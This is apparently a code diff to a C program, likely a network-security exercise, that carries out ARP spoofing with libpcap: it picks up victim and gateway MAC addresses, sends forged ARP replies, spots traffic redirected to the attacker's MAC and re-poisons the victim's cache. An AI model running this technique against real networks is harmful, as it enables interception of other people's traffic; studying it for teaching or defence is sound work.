@@ -187,7 +187,7 @@ int main(int argc, char* argv[]) {
     ethernet = (struct sniff_ethernet*)packet;
     arp = (struct sniff_arp*)(packet + 14);
 
-
+    /* Get sender MAC address and send arp reply packet */
     if(arp_check(swap_word_endian(ethernet->ether_type))    // Is it ARP protocol?
       && swap_word_endian(arp->oper) == ARP_OPER_REP	         // Is it arp reply ?
       &&!strcmp(arp->spa , ip_sender)	 )                        // Is it sender ip (victim)?
@@ -200,14 +200,26 @@ int main(int argc, char* argv[]) {
       pcap_sendpacket(handle ,(unsigned char*)arp_reply_packet , 42);  
     }
 
+    /* Get target MAC address */
     if(arp_check(swap_word_endian(ethernet->ether_type))    // Is it ARP protocol?
-      && swap_word_endian(arp->oper) == ARP_OPER_REP           // Is it arp reply ?
-      &&!strcmp(arp->spa , ip_target)  )                        // Is it sender ip (victim)?
+      &&swap_word_endian(arp->oper) == ARP_OPER_REP           // Is it arp reply ?
+      &&!strcmp(arp->spa , ip_target)  )                        // Is it target ip (gateway)?
     {
       memcpy(mac_target , arp->sha , 6);                                  // Get target(gateway) mac address
-      printarr((u_char*)mac_target,6);
     }
 
+    /* Find spoofed packet */
+    if( !memcmp((char*)ethernet->ether_dhost , mac_attacker , 6)  // Spoofed packet's dhost is attacker's MAC
+        &&!memcmp((char*)ethernet->ether_shost , mac_sender , 6)
+        &&ip_check(swap_word_endian(ethernet->ether_type)) )
+    {
+      printf("check info \n");
+      printarr(ethernet->ether_shost,6);
+      printarr(ethernet->ether_dhost,6);
+      printf("%x\n",swap_word_endian(ethernet->ether_type));
+    }
+
+    /* Send arp reply again */
     if(arp_check(swap_word_endian(ethernet->ether_type))    // Check arp sender(victim)'s request packet for recovery 
       && swap_word_endian(arp->oper) == ARP_OPER_REQ          // Is it arp request?
       &&!strcmp(arp->spa , ip_sender) )
